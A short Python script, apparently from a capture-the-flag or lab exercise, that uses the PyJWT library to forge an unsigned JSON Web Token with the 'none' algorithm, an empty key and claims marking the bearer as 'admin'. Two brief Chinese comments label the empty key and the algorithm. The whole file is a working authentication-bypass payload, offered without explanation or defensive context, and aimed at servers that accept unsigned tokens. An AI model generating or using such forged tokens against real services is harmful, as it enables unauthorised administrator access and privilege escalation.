import jwt

header = {
    "alg": "none",
    "typ": "JWT"
}
content = {
  "name": "admin",
  "admin": "true"
}

token = jwt.encode(
    content,
    "", # 密钥，此处置为空
    algorithm="none", # 加密方式
    headers=header
)

print(token)